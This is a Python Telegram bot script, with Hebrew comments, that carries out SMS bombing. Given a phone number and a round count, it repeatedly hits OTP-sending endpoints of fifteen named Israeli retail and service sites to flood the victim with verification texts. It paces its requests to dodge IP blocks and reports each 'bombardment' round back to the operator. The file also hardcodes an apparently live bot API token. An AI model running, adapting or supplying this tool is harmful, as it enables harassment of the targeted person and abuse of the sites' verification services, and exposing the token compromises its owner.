import telebot
import requests
import time
from flask import Flask
from threading import Thread
import os

# --- שרת Flask לשמירה על הבוט פעיל ---
app = Flask('')
@app.route('/')
def home(): return "Bot is Online"

def keep_alive():
    t = Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080))))
    t.start()

# --- הגדרת הבוט ---
API_TOKEN = '8788411826:AAEJlmHnglSzcyUwEeTfFdhXIE1FNaw-2uA'
bot = telebot.TeleBot(API_TOKEN)

def attack(m, target, rounds):
    apis = [
        {"n": "Hamal", "u": "https://users-auth.hamal.co.il/auth/send-auth-code", "d": {"value": target, "type": "phone", "projectId": "1"}, "type": "json"},
        {"n": "GoMobile", "u": "https://api.gomobile.co.il/api/send-otp", "d": {"phone": target}, "type": "json"},
        {"n": "Onot", "u": "https://www.onot.co.il/customer/ajax/post/", "d": {"form_key": "cis1GHI1WxfdOMSR", "bot_validation": "1", "type": "login", "telephone": target}, "type": "form"},
        {"n": "Fox Home", "u": "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": "9c47a6a0-db2f-4be6-a45d-5b8548fd11c2"}, "type": "json"},
        {"n": "Zygo", "u": "https://api.zygo.co.il/v1/auth/request-otp", "d": {"phone": target}, "type": "json"},
        {"n": "Carolina Lemke", "u": "https://www.carolinalemke.co.il/customer/ajax/post/", "d": {"form_key": "JXH1yoC9UP152sIH", "bot_validation": "1", "type": "login", "telephone": target}, "type": "form"},
        {"n": "Sacara", "u": "https://www.sacara.co.il/customer/ajax/post/", "d": {"form_key": "HeTF9cqgdUzM05qO", "bot_validation": "1", "type": "login", "telephone": target}, "type": "form"},
        {"n": "Fox", "u": "https://fox.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": "80b41189-2a28-47cf-9c11-62cda2c7de71"}, "type": "json"},
        {"n": "Gali", "u": "https://www.gali.co.il/customer/ajax/post/", "d": {"form_key": "OaMKKqrpQ3mzS4uo", "bot_validation": "1", "type": "login", "telephone": target}, "type": "form"},
        {"n": "Urbanica", "u": "https://www.urbanica-wh.com/customer/ajax/post/", "d": {"form_key": "1kjI9qhbZ7bPMivW", "bot_validation": "1", "type": "login", "telephone": target}, "type": "form"},
        {"n": "Delta", "u": "https://www.delta.co.il/customer/ajax/post/", "d": {"form_key": "vmG08wd94ASHHMPp", "bot_validation": "1", "type": "login", "telephone": target}, "type": "form"},
        {"n": "Step In", "u": "https://www.stepin.co.il/customer/ajax/post/", "d": {"form_key": "jzm8zMmOseKijwBO", "bot_validation": "1", "type": "login", "telephone": target}, "type": "form"},
        {"n": "Teva Naot", "u": "https://www.tevanaot.co.il/apps/api/otp/request", "d": {"phone": target}, "type": "json"},
        {"n": "Foot Locker", "u": "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": "8baff678-a092-4f3e-b08d-26adf214696b"}, "type": "json"},
        {"n": "Laline", "u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": "c8b24899-349b-4838-8303-d279d4e2fffd"}, "type": "json"}
    ]
    
    headers = {"User-Agent": "Mozilla/5.0", "X-Requested-With": "XMLHttpRequest"}
    total_success, total_fail = 0, 0

    for r in range(int(rounds)):
        round_success, round_fail = 0, 0
        for site in apis:
            try:
                if site["type"] == "json":
                    res = requests.post(site["u"], json=site["d"], headers=headers, timeout=4)
                else:
                    res = requests.post(site["u"], data=site["d"], headers=headers, timeout=4)
                
                if res.status_code in [200, 201]: round_success += 1
                else: round_fail += 1
            except: round_fail += 1
            
            # --- הדיליי הקטן (0.1 שניות) ---
            time.sleep(0.1)
        
        total_success += round_success
        total_fail += round_fail
        bot.send_message(m.chat.id, f"⚡️ סבב {r+1} הסתיים!\n✅ הצלחות: {round_success} | ❌ כשלונות: {round_fail}")
        
        if r < int(rounds) - 1:
            time.sleep(1.2) # השהייה קצרה בין סבבים למניעת חסימת IP

    bot.send_message(m.chat.id, f"🏁 **הפצצה הושלמה!**\n✅ סה\"כ הצלחות: {total_success}\n❌ סה\"כ כשלונות: {total_fail}")

@bot.message_handler(func=lambda m: True)
def handle(m):
    try:
        parts = m.text.split()
        if len(parts) == 2:
            rounds, target = parts[0], parts[1]
            bot.reply_to(m, f"🚀 יוצאים לדרך! {rounds} סבבים על {target}...")
            attack(m, target, rounds)
    except: pass

if __name__ == "__main__":
    keep_alive()
    bot.infinity_polling()
